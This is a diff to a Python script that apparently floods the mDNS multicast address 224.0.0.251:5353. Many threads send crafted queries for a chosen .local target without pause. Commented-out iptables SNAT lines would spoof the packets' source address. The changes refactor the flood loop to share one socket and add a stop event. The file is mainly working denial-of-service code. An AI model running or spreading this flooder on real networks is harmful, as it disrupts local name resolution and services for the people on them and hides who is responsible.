@@ -7,8 +7,6 @@ import time
 import binascii
 import socket
 
-#time_out = 0
-#packets = 0
 multicast_add = "224.0.0.251"
 mdns_port = 5353
 
@@ -42,7 +40,7 @@ def build_message(type="A", address=""):
 	OPCODE = 0  # Standard query		4bit
 	AA = 0	    # ?				1bit
 	TC = 0	    # Message is truncated?	1bit
-	RD = 1	    # Recursion?		1bit
+	RD = 0	    # Recursion?		1bit
 	RA = 0	    # ?				1bit
 	Z = 0	    # ?				3bit
 	RCODE = 0   # ?				4bit
@@ -87,29 +85,16 @@ def build_message(type="A", address=""):
 
 	return message
 
-def send_query(host, RRtype):
-	#global time_out
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #one socker per thread
-	
-	while True:
-		message = build_message(RRtype, host)
-		message = message.replace(" ", "").replace("\n", "") 
-
-		try:
+def send_query(host, RRtype, sock, stop_event):	
+	try:
+		while not stop_event.is_set():
+			message = build_message(RRtype, host)
+			message = message.replace(" ", "").replace("\n", "") 
 			sock.sendto(binascii.unhexlify(message), (multicast_add, mdns_port))
-		except Exception as e:
-			print(e)
-	sock.close()
-
-#def signal_handler(sig, frame):
-	#print('\nStats:')
-	#print(f"Timeout events:{time_out}")
-	#sys.exit(0)
+	except Exception as e:
+		print(e)
 
 def __main__():
-	#global time_out
-	#signal.signal(signal.SIGINT, signal_handler) #CTRL+C to end gracefully
-	
 	parser = argparse.ArgumentParser()
 	parser.add_argument("--target", "-t", help="Set the .local target")
 	parser.add_argument("--type", "-rr", help="Set the RR type to query")
@@ -122,10 +107,12 @@ def __main__():
 		sys.exit(1)
 		
 	#os.system(f"sudo iptables -t nat -A POSTROUTING -j SNAT --to-source {args.spoofed_ip}")
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	stop_event = threading.Event()
 	
 	try:
 		for i in range(int(args.nthreads)):
-			t = threading.Thread(target=send_query, args=[args.target,args.type])
+			t = threading.Thread(target=send_query, args=[args.target,args.type, sock, stop_event])
 			t.daemon = True
 			t.start()
 			print(f'Active Threads: {threading.active_count()}', end="\r")
@@ -133,9 +120,10 @@ def __main__():
 			time.sleep(0.5)
 	except KeyboardInterrupt:
 		print("Quitting...\n")
-
-	#print(f"Packets sent: {len(threads)}")
-	#os.system(f"sudo iptables -t nat -D POSTROUTING -j SNAT --to-source {args.spoofed_ip}")
+		stop_event.set()
+		time.sleep(1)
+		sock.close()
+		#os.system(f"sudo iptables -t nat -D POSTROUTING -j SNAT --to-source {args.spoofed_ip}")
 
 if __name__ == "__main__":
 	__main__()
